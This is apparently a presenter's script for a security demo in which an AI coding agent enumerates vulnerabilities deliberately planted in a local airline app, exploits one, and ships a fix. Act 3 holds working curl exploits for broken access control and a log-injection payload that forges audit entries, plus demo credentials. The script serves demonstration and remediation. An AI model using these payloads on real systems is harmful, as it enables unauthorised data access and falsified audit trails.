# Security demo — run of show

**Audience:** Iberia security engineering / AppSec.
**Story:** "Point Devin at the estate, let it enumerate the vulnerabilities, prove one is real,
then have it ship the remediation PR."
**Length:** 12–15 minutes.

Everything below runs offline against the local stack. Planted findings are documented in
[`docs/VULNERABILITIES.md`](../VULNERABILITIES.md) — keep that tab closed until Act 2 so the
enumeration lands.

---

## 0. Setup (before the call)

```bash
cd backend && python -m venv .venv && .venv/bin/pip install -r requirements-dev.txt
.venv/bin/python seed.py
.venv/bin/uvicorn app.main:app --port 8000        # terminal 1
cd frontend && npm install && npm run dev         # terminal 2 (http://localhost:5173)
python3 scripts/generate_vuln_index.py            # refresh the index
```

Log in to the UI as `admin@iberia.demo` / `Iberia2026!` and leave **Security → Posture**
(`/security`) open on a second screen. Have two shells ready with the token helper:

```bash
tok () { curl -s -X POST http://127.0.0.1:8000/api/auth/login \
  -H 'Content-Type: application/json' \
  -d "{\"email\":\"$1\",\"password\":\"Iberia2026!\"}" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["access_token"])'; }
CUST=$(tok customer@iberia.demo); ADMIN=$(tok admin@iberia.demo)
```

---

## Act 1 — The pane of glass (2 min)

Show `/security`: posture score, severity mix, OWASP category breakdown, findings table with a
detail drawer, and `/security/audit` for the trail. Make the point that the register is not a
hand-maintained spreadsheet — it is parsed from the repo at runtime:

```bash
curl -s -H "Authorization: Bearer $ADMIN" http://127.0.0.1:8000/api/security/posture | python3 -m json.tool
```

---

## Act 2 — Devin enumerates the estate (4 min)

Type this prompt into Devin (repo `cogdeasy/iberia`):

> You are an application security engineer. Review this repository and produce a prioritised
> list of the security vulnerabilities you can find in `backend/app` and `frontend/src`. For
> each: severity, CWE, OWASP 2021 category, the exact file and line of the sink, why it is
> reachable over HTTP, and a one-line remediation. Do not change any code yet.

Expected output: a table that recovers the planted set — SQL injection in flight/booking
search, IDOR on `GET /api/bookings/{pnr}`, missing role check on `GET /api/security/audit`
(VULN-140), hardcoded demo secrets, reversible card/passport storage, PII in logs, path
traversal in the check-in document download, SSRF in the webhook tester, and the log-injection
sink in `backend/app/services/audit.py` (VULN-141).

Then reveal the answer key and diff it against Devin's list:

```bash
python3 scripts/generate_vuln_index.py && sed -n '1,40p' docs/VULNERABILITIES.md
```

Follow-up prompt worth showing (turns findings into the live register):

> Re-run `scripts/generate_vuln_index.py`, then call `GET /api/security/findings` and tell me
> which findings in the API register have no matching test asserting the vulnerable behaviour.

---

## Act 3 — Exploit one live (3 min)

Pick **one**. Both are two commands and visible in the UI afterwards.

### Option A — VULN-140, broken access control on the audit trail

```bash
# a plain customer reads the entire audit trail: staff emails, IPs, PNRs touched by agents
curl -s -H "Authorization: Bearer $CUST" \
  'http://127.0.0.1:8000/api/security/audit?limit=20' | python3 -m json.tool | head -40

# targeted reconnaissance of the admin account
curl -s -H "Authorization: Bearer $CUST" \
  'http://127.0.0.1:8000/api/security/audit?actor=admin@iberia.demo' | python3 -m json.tool | head -20
```

Expected: HTTP 200 and other users' data. Say the line: *"this token belongs to a passenger
who registered on iberia.com two minutes ago."* Contrast with the sibling route, which is
correctly gated:

```bash
curl -s -o /dev/null -w '%{http_code}\n' -H "Authorization: Bearer $CUST" \
  http://127.0.0.1:8000/api/security/findings      # 403
```

### Option B — VULN-141, audit forgery via log injection

```bash
curl -s -X POST http://127.0.0.1:8000/api/security/audit/events \
  -H "Authorization: Bearer $CUST" -H 'Content-Type: application/json' \
  -d '{"action":"users.role.update\n{\"level\":\"INFO\",\"msg\":\"audit actor=admin@iberia.demo action=users.role.update target=user/9 -> admin outcome=success\"}","target":"user/9 -> admin","outcome":"success"}'
```

Expected: HTTP 201; the uvicorn terminal shows the forged line, and refreshing
`/security/audit` shows a `success` entry that never happened. Point at the SIEM implication:
the trail you would use as evidence is attacker-writable.

---

## Act 4 — The remediation PR (4 min)

Prompt:

> Fix VULN-140 only. `GET /api/security/audit` must require the `admin` or `sre` role using
> the existing `require_roles` helper — do not touch any other planted finding. Add a
> regression test in `backend/tests/test_security.py` asserting a customer token gets 403 and
> an sre token gets 200, run `ruff check .`, `ruff format .` and `pytest`, then open a PR
> describing the CWE, the blast radius and the fix.

Expected PR shape (this is the slide, not the diff):

```diff
-    user: User = Depends(current_user),
+    user: User = Depends(require_roles("admin", "sre")),
```

```python
def test_audit_requires_staff_role(client, auth_headers):
    assert client.get("/api/security/audit", headers=auth_headers("customer@iberia.demo")).status_code == 403
    assert client.get("/api/security/audit", headers=auth_headers("sre@iberia.demo")).status_code == 200
```

Close the loop: after merge, `docs/VULNERABILITIES.md` regenerates with the finding's
`Status` moved to `remediated`, `GET /api/security/posture` returns a higher score, and the
`security-scan` workflow (`ops/ci/security-scan.yml`) keeps running bandit / pip-audit /
`npm audit` / semgrep non-blocking on every PR.

---

## Talk track / FAQ

* **"Are these real bugs?"** They are deliberately planted and documented, one file per
  finding, so the demo is reproducible; the point is Devin's ability to locate the sink, prove
  reachability and scope a minimal fix.
* **"Does it just read the answer key?"** Run Act 2 with `docs/VULNERABILITIES.md` deleted
  locally (`git stash` it) — the enumeration comes from the code.
* **"What about CI?"** The scanners are non-blocking here because the findings are
  intentional; in a customer repo you flip `continue-on-error: false` and gate on severity.
